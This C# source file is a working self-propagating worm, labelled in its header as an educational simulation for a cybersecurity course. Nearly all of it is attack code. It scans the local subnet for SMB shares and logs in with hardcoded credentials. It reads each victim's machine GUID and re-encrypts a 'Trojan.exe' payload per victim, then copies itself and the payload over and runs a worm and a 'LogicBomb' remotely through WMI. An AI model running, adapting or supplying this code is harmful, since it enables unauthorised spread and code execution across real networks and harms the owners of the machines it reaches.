using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using AuthenticationLevel = System.Management.AuthenticationLevel;
using Microsoft.Win32;

/// <summary>
/// EDUCATIONAL MALWARE SIMULATION - FOR CYBERSECURITY COURSE ONLY
/// Self-Propagating Worm with Polymorphic Encryption
/// MUST ONLY BE RUN IN ISOLATED VM ENVIRONMENTS
/// </summary>
class Program
{
    private const string SMB_USERNAME = "user";
    private const string SMB_PASSWORD = "user";
    private const string SMB_SHARE_NAME = "SharedFolder";
    private const string PAYLOAD_FOLDER_NAME = "payload";
    private const string WORM_EXE_NAME = "Worm.exe";
    private const string LOGICBOMB_EXE_NAME = "LogicBomb.exe";
    private const string ENCRYPTED_BOMB_NAME = "bomb.encrypted";

    private const int PING_TIMEOUT_MS = 300;
    private const int MAX_CONCURRENT_SCANS = 50;
    private const int SCAN_TIMEOUT_MINUTES = 5;

    static async Task Main()
    {
        Console.WriteLine("===========================================");
        Console.WriteLine("SELF-PROPAGATING WORM - EDUCATIONAL USE ONLY");
        Console.WriteLine("Polymorphic Encryption Edition");
        Console.WriteLine("===========================================");
        Console.WriteLine();

        Console.WriteLine("Starting Network Scan, Polymorphic Encryption, and Self-Propagation...");
        Console.WriteLine("-----------------------------------");

        string localIP = GetLocalIPAddress();
        if (localIP == null)
        {
            LogError("Could not detect local IP address.");
            WaitForExit();
            return;
        }

        string baseIP = string.Join(".", localIP.Split('.').Take(3));
        LogInfo($"Local IP Address detected: {localIP}");
        LogInfo($"Scanning network: {baseIP}.1 - {baseIP}.254 for active SMB servers...");

        List<string> smbHosts;
        string tempFolder = null;

        try
        {
            using (var cts = new CancellationTokenSource(TimeSpan.FromMinutes(SCAN_TIMEOUT_MINUTES)))
            {
                var progress = new Progress<ScanProgress>(p =>
                {
                    Console.Write($"\r[SCAN] Progress: {p.Completed}/254 hosts checked, {p.ActiveSmb} SMB hosts found");
                });

                smbHosts = await FindSmbServersAsync(baseIP, progress, cts.Token);
                Console.WriteLine();
            }

            if (smbHosts.Count == 0)
            {
                LogInfo("No SMB servers found. Exiting.");
                WaitForExit();
                return;
            }

            LogInfo($"Found {smbHosts.Count} SMB host(s) with accessible shares.");

            // Prepare deployment package
            tempFolder = Path.Combine(Path.GetTempPath(), $"WormDeployment_{Guid.NewGuid():N}");
            LogInfo($"Preparing deployment package in temporary folder: {tempFolder}");
            PrepareDeploymentPackage(tempFolder);

            // Deploy to each discovered host
            foreach (string ip in smbHosts)
            {
                await ProcessTargetHost(ip, tempFolder);
            }

            Console.WriteLine("-----------------------------------");
            LogInfo("Network propagation complete.");
        }
        catch (OperationCanceledException)
        {
            LogWarning("Operation timed out or was cancelled.");
        }
        catch (Exception ex)
        {
            LogError($"Unexpected error: {ex.Message}");
            LogError($"Stack trace: {ex.StackTrace}");
        }
        finally
        {
            if (tempFolder != null && Directory.Exists(tempFolder))
            {
                try
                {
                    LogInfo($"Deleting temporary directory: {tempFolder}");
                    Directory.Delete(tempFolder, true);
                    LogInfo("Cleanup completed successfully.");
                }
                catch (Exception ex)
                {
                    LogError($"Failed to clean up temporary folder: {ex.Message}");
                }
            }
        }

        WaitForExit();
    }

    private static async Task ProcessTargetHost(string ip, string tempFolder)
    {
        string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
        LogInfo($"Processing target: {ip}");
        LogInfo($"Attempting SMB connection to {remoteShareUNC}...");

        int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);

        if (smbConnectResult == 0)
        {
            try
            {
                LogSuccess($"Connected to {ip}");

                // Step 1: Get victim's Machine GUID
                string victimMachineGuid = GetRemoteMachineGuid(ip, SMB_USERNAME, SMB_PASSWORD);
                LogInfo($"Victim Machine GUID: {victimMachineGuid}");

                // Step 2: Re-encrypt Trojan.exe with victim-specific key
                LogInfo($"Generating victim-specific encryption for {ip}...");
                string victimSpecificBomb = Path.Combine(tempFolder, "bomb_victim.encrypted");
                ReEncryptTrojanForVictim(tempFolder, victimSpecificBomb, victimMachineGuid);
                LogSuccess($"Created victim-specific encrypted payload");

                // Step 3: Copy files to victim
                LogInfo($"Copying files to {remoteShareUNC}...");

                // Copy Worm.exe
                string localWormPath = Path.Combine(tempFolder, WORM_EXE_NAME);
                string remoteWormPath = Path.Combine(remoteShareUNC, WORM_EXE_NAME);
                File.Copy(localWormPath, remoteWormPath, true);
                LogSuccess($"Copied {WORM_EXE_NAME}");

                // Copy payload folder
                string localPayloadFolder = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME);
                string remotePayloadFolder = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME);
                await CopyFolderAsync(localPayloadFolder, remotePayloadFolder);

                // Overwrite bomb.encrypted with victim-specific version
                string remoteBombPath = Path.Combine(remotePayloadFolder, ENCRYPTED_BOMB_NAME);
                File.Copy(victimSpecificBomb, remoteBombPath, true);
                LogSuccess($"Deployed victim-specific encrypted payload");

                // Step 4: Execute both Worm and LogicBomb on victim via WMI
                LogInfo($"Executing self-propagation on {ip}...");

                string remoteWormExePath = $"C:\\{SMB_SHARE_NAME}\\{WORM_EXE_NAME}";
                string remoteLogicBombPath = $"C:\\{SMB_SHARE_NAME}\\{PAYLOAD_FOLDER_NAME}\\{LOGICBOMB_EXE_NAME}";

                // Execute Worm (for continued spreading)
                bool wormExecuted = ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteWormExePath, "Worm");
                if (wormExecuted)
                {
                    LogSuccess($"Worm.exe executed on {ip} - will continue spreading");
                }
                else
                {
                    LogWarning($"Failed to execute Worm.exe on {ip}");
                }

                // Execute LogicBomb (waits for Defender to go down)
                bool logicBombExecuted = ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteLogicBombPath, "LogicBomb");
                if (logicBombExecuted)
                {
                    LogSuccess($"LogicBomb.exe executed on {ip} - monitoring for trigger");
                }
                else
                {
                    LogWarning($"Failed to execute LogicBomb.exe on {ip}");
                }

                // Clean up victim-specific bomb file
                if (File.Exists(victimSpecificBomb))
                {
                    File.Delete(victimSpecificBomb);
                }

                LogSuccess($"Successfully propagated to {ip}");
            }
            catch (Exception ex)
            {
                LogError($"Error processing {ip}: {ex.Message}");
            }
            finally
            {
                DisconnectFromRemoteShare(remoteShareUNC);
            }
        }
        else
        {
            LogWarning($"SMB connection to {ip} failed - Error Code: {smbConnectResult} ({GetWNetErrorDescription(smbConnectResult)})");
        }

        Console.WriteLine();
    }

    private static string GetRemoteMachineGuid(string remoteIp, string username, string password)
    {
        LogInfo($"Querying Machine GUID from {remoteIp} via WMI...");

        try
        {
            ConnectionOptions connOpts = new ConnectionOptions
            {
                Username = username,
                Password = password,
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.Default,
                EnablePrivileges = true,
                Timeout = TimeSpan.FromSeconds(15)
            };

            string path = $"\\\\{remoteIp}\\root\\CIMV2";
            var scope = new ManagementScope(path, connOpts);
            scope.Connect();

            // Query registry via WMI
            string query = "SELECT * FROM StdRegProv";
            var regProv = new ManagementClass(scope, new ManagementPath(query), null);

            // Read MachineGuid from registry
            var inParams = regProv.GetMethodParameters("GetStringValue");
            inParams["hDefKey"] = 0x80000002; // HKEY_LOCAL_MACHINE
            inParams["sSubKeyName"] = @"SOFTWARE\Microsoft\Cryptography";
            inParams["sValueName"] = "MachineGuid";

            var outParams = regProv.InvokeMethod("GetStringValue", inParams, null);

            if (outParams != null && outParams["sValue"] != null)
            {
                string guid = outParams["sValue"].ToString();
                if (!string.IsNullOrEmpty(guid))
                {
                    LogSuccess($"Retrieved Machine GUID from {remoteIp}: {guid}");
                    return guid;
                }
            }
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to get Machine GUID from {remoteIp}: {ex.Message}");
        }

        LogWarning($"Using fallback Machine ID for {remoteIp}");
        return "DEFAULT_MACHINE_ID";
    }

    private static void ReEncryptTrojanForVictim(string tempFolder, string outputPath, string victimMachineGuid)
    {
        // Find original Trojan.exe in the payload folder
        string trojanPath = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME, "Trojan.exe");

        if (!File.Exists(trojanPath))
        {
            // Try to find it as bomb.encrypted and decrypt first with local machine key
            string localBombPath = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME, ENCRYPTED_BOMB_NAME);
            if (File.Exists(localBombPath))
            {
                LogInfo("Decrypting local bomb.encrypted to get Trojan.exe...");
                string localMachineGuid = CryptoUtils.GetMachineGuid();
                CryptoUtils.DecryptFile(localBombPath, trojanPath, localMachineGuid);
            }
            else
            {
                throw new FileNotFoundException($"Trojan.exe not found at {trojanPath}");
            }
        }

        LogInfo($"Re-encrypting Trojan.exe with victim's Machine GUID...");
        CryptoUtils.EncryptFile(trojanPath, outputPath, victimMachineGuid);

        // Log the derived keys for debugging
        CryptoUtils.LogDerivedKeys(victimMachineGuid);
    }

    private static async Task<List<string>> FindSmbServersAsync(
        string baseIP,
        IProgress<ScanProgress> progress = null,
        CancellationToken cancellationToken = default)
    {
        var activeHosts = new List<string>();
        var pingTasks = new List<Task>();
        var semaphore = new SemaphoreSlim(MAX_CONCURRENT_SCANS);
        int completed = 0;
        int activeSmbCount = 0;

        for (int i = 1; i <= 254; i++)
        {
            if (cancellationToken.IsCancellationRequested)
                break;

            string ip = $"{baseIP}.{i}";
            await semaphore.WaitAsync(cancellationToken);

            pingTasks.Add(Task.Run(async () =>
            {
                try
                {
                    using (var ping = new Ping())
                    {
                        var reply = await ping.SendPingAsync(ip, PING_TIMEOUT_MS);

                        if (reply.Status == IPStatus.Success)
                        {
                            string smbPath = $"\\\\{ip}\\{SMB_SHARE_NAME}";
                            int result = ConnectToRemoteShare(smbPath, SMB_USERNAME, SMB_PASSWORD);

                            if (result == 0)
                            {
                                Console.WriteLine($"\n[ACTIVE SMB] {ip} - Share '{SMB_SHARE_NAME}' accessible");
                                lock (activeHosts)
                                {
                                    activeHosts.Add(ip);
                                    activeSmbCount++;
                                }
                                DisconnectFromRemoteShare(smbPath);
                            }
                        }
                    }
                }
                catch (PingException) { }
                catch (Exception ex)
                {
                    LogError($"{ip} - {ex.Message}");
                }
                finally
                {
                    semaphore.Release();
                    int currentCompleted = Interlocked.Increment(ref completed);
                    progress?.Report(new ScanProgress
                    {
                        Completed = currentCompleted,
                        ActiveSmb = activeSmbCount
                    });
                }
            }, cancellationToken));
        }

        await Task.WhenAll(pingTasks);
        return activeHosts;
    }

    private static void PrepareDeploymentPackage(string tempFolder)
    {
        try
        {
            Directory.CreateDirectory(tempFolder);

            // Copy current Worm executable
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string exeName = Path.GetFileName(exePath);
            string destExePath = Path.Combine(tempFolder, exeName);

            File.Copy(exePath, destExePath, overwrite: true);
            LogInfo($"Copied {exeName} to deployment package");

            // Copy payload folder if it exists
            string payloadFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, PAYLOAD_FOLDER_NAME);

            if (Directory.Exists(payloadFolder))
            {
                string destPayloadFolder = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME);
                CopyFolderSync(payloadFolder, destPayloadFolder);
                LogInfo($"Copied '{PAYLOAD_FOLDER_NAME}' folder to deployment package");
            }
            else
            {
                LogWarning($"'{PAYLOAD_FOLDER_NAME}' folder not found at {payloadFolder}");
                throw new DirectoryNotFoundException($"Payload folder not found: {payloadFolder}");
            }

            LogSuccess("Deployment package prepared successfully.");
        }
        catch (Exception ex)
        {
            LogError($"Failed to prepare deployment package: {ex.Message}");
            throw;
        }
    }

    private static void CopyFolderSync(string source, string dest)
    {
        Directory.CreateDirectory(dest);

        foreach (string file in Directory.GetFiles(source))
        {
            string fileName = Path.GetFileName(file);
            File.Copy(file, Path.Combine(dest, fileName), true);
        }

        foreach (string dir in Directory.GetDirectories(source))
        {
            string dirName = Path.GetFileName(dir);
            CopyFolderSync(dir, Path.Combine(dest, dirName));
        }
    }

    private static async Task CopyFolderAsync(string source, string dest)
    {
        Directory.CreateDirectory(dest);

        var fileTasks = Directory.GetFiles(source)
            .Select(file => Task.Run(() =>
            {
                string fileName = Path.GetFileName(file);
                File.Copy(file, Path.Combine(dest, fileName), true);
            }))
            .ToList();

        await Task.WhenAll(fileTasks);

        foreach (string dir in Directory.GetDirectories(source))
        {
            string dirName = Path.GetFileName(dir);
            await CopyFolderAsync(dir, Path.Combine(dest, dirName));
        }
    }

    private static string GetLocalIPAddress()
    {
        try
        {
            var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
            return host.AddressList
                .FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                ?.ToString();
        }
        catch (Exception ex)
        {
            LogError($"Failed to get local IP address: {ex.Message}");
            return null;
        }
    }

    private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string commandToExecute, string componentName)
    {
        LogInfo($"Attempting WMI execution of {componentName} on {remoteIp}...");

        try
        {
            ConnectionOptions connOpts = new ConnectionOptions
            {
                Username = username,
                Password = password,
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.Default,
                EnablePrivileges = true,
                Authority = null,
                Timeout = TimeSpan.FromSeconds(30)
            };

            string path = $"\\\\{remoteIp}\\root\\cimv2";
            var scope = new ManagementScope(path, connOpts);

            LogInfo($"Connecting to WMI namespace: {path}");
            scope.Connect();
            LogInfo("WMI connection established");

            using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions()))
            {
                var inParams = processClass.GetMethodParameters("Create");
                inParams["CommandLine"] = commandToExecute;

                LogInfo($"Executing: {commandToExecute}");
                var outParams = processClass.InvokeMethod("Create", inParams, null);

                if (outParams != null)
                {
                    var returnCode = Convert.ToInt32(outParams["returnValue"]);
                    var newPid = outParams["processId"] != null ? outParams["processId"].ToString() : "(none)";

                    string resultMessage = GetWmiReturnCodeDescription(returnCode);
                    LogInfo($"WMI Create returned code {returnCode}: {resultMessage}, ProcessID: {newPid}");

                    if (returnCode == 0)
                    {
                        LogSuccess($"{componentName} execution successful on {remoteIp}");
                        return true;
                    }
                    else if (returnCode == 2)
                    {
                        LogWarning($"WMI returned 'Access Denied' but {componentName} may have launched on {remoteIp}");
                        return true;
                    }
                    else
                    {
                        LogWarning($"{componentName} execution failed with code {returnCode}");
                    }
                }
                else
                {
                    LogWarning("WMI InvokeMethod returned null");
                }
            }
        }
        catch (ManagementException mex)
        {
            LogError($"WMI ManagementException on {remoteIp}: {mex.Message}");
            if (mex.InnerException != null)
            {
                LogError($"Inner Exception: {mex.InnerException.Message}");
            }
        }
        catch (UnauthorizedAccessException uex)
        {
            LogError($"Unauthorized Access on {remoteIp}: {uex.Message}");
        }
        catch (System.Runtime.InteropServices.COMException comEx)
        {
            LogError($"COM Exception on {remoteIp}: {comEx.Message} (HRESULT: 0x{comEx.HResult:X})");
        }
        catch (Exception ex)
        {
            LogError($"Unexpected exception on {remoteIp}: {ex.GetType().Name} - {ex.Message}");
        }

        return false;
    }

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetCancelConnection2(string name, int flags, bool force);

    private static int ConnectToRemoteShare(string remotePath, string username, string password)
    {
        var nr = new NETRESOURCE
        {
            dwType = 1,
            lpRemoteName = remotePath
        };
        return WNetAddConnection2(ref nr, password, username, 0);
    }

    private static void DisconnectFromRemoteShare(string remotePath)
    {
        try
        {
            WNetCancelConnection2(remotePath, 0, true);
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to disconnect from {remotePath}: {ex.Message}");
        }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct NETRESOURCE
    {
        public int dwScope;
        public int dwType;
        public int dwDisplayType;
        public int dwUsage;
        public string lpLocalName;
        public string lpRemoteName;
        public string lpComment;
        public string lpProvider;
    }

    private static void LogInfo(string message)
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.Write("[INFO] ");
        Console.ResetColor();
        Console.WriteLine(message);
    }

    private static void LogSuccess(string message)
    {
        Console.ForegroundColor = ConsoleColor.Green;
        Console.Write("[SUCCESS] ");
        Console.ResetColor();
        Console.WriteLine(message);
    }

    private static void LogWarning(string message)
    {
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.Write("[WARNING] ");
        Console.ResetColor();
        Console.WriteLine(message);
    }

    private static void LogError(string message)
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.Write("[ERROR] ");
        Console.ResetColor();
        Console.WriteLine(message);
    }

    private static string GetWmiReturnCodeDescription(int returnCode)
    {
        switch (returnCode)
        {
            case 0: return "Successful completion";
            case 2: return "Access denied";
            case 3: return "Insufficient privilege";
            case 8: return "Unknown failure";
            case 9: return "Path not found";
            case 21: return "Invalid parameter";
            default: return $"Unknown error code: {returnCode}";
        }
    }

    private static string GetWNetErrorDescription(int errorCode)
    {
        switch (errorCode)
        {
            case 0: return "Success";
            case 5: return "Access is denied";
            case 53: return "The network path was not found";
            case 86: return "The specified network password is not correct";
            case 1219: return "Multiple connections to a server not allowed";
            case 1326: return "Logon failure: unknown user name or bad password";
            default: return $"Error code {errorCode}";
        }
    }

    private static void WaitForExit()
    {
        Console.WriteLine();
        Console.WriteLine("Press any key to exit.");
        Console.ReadKey();
    }

    private struct ScanProgress
    {
        public int Completed { get; set; }
        public int ActiveSmb { get; set; }
    }

    // Embedded CryptoUtils class
    public static class CryptoUtils
    {
        private const string DEFAULT_MACHINE_ID = "DEFAULT_MACHINE_ID";
        private const string IV_SALT = "_IV_SALT_2025";

        public static string GetMachineGuid()
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
                {
                    if (key != null)
                    {
                        object guidValue = key.GetValue("MachineGuid");
                        if (guidValue != null)
                        {
                            string guid = guidValue.ToString();
                            if (!string.IsNullOrEmpty(guid))
                            {
                                return guid;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[CryptoUtils] Failed to read Machine GUID: {ex.Message}");
            }

            Console.WriteLine($"[CryptoUtils] Using fallback: {DEFAULT_MACHINE_ID}");
            return DEFAULT_MACHINE_ID;
        }

        public static byte[] DeriveKeyFromMachineId(string machineId)
        {
            using (SHA256 sha = SHA256.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId);
                byte[] hash = sha.ComputeHash(inputBytes);

                byte[] key = new byte[32];
                Array.Copy(hash, key, 32);

                return key;
            }
        }

        public static byte[] DeriveIVFromMachineId(string machineId)
        {
            using (SHA256 sha = SHA256.Create())
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId + IV_SALT);
                byte[] hash = sha.ComputeHash(inputBytes);

                byte[] iv = new byte[16];
                Array.Copy(hash, iv, 16);

                return iv;
            }
        }

        public static void EncryptFile(string inputFile, string outputFile, string machineId)
        {
            byte[] key = DeriveKeyFromMachineId(machineId);
            byte[] iv = DeriveIVFromMachineId(machineId);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                using (CryptoStream cs = new CryptoStream(fsOutput, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    fsInput.CopyTo(cs);
                }
            }
        }

        public static void DecryptFile(string inputFile, string outputFile, string machineId)
        {
            byte[] key = DeriveKeyFromMachineId(machineId);
            byte[] iv = DeriveIVFromMachineId(machineId);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                using (CryptoStream cs = new CryptoStream(fsInput, aes.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    cs.CopyTo(fsOutput);
                }
            }
        }

        public static void LogDerivedKeys(string machineId)
        {
            byte[] key = DeriveKeyFromMachineId(machineId);
            byte[] iv = DeriveIVFromMachineId(machineId);

            Console.WriteLine($"[CryptoUtils] Derived Key (first 16 bytes): {BitConverter.ToString(key).Replace("-", "").Substring(0, 32)}...");
            Console.WriteLine($"[CryptoUtils] Derived IV: {BitConverter.ToString(iv).Replace("-", "")}");
        }
    }
}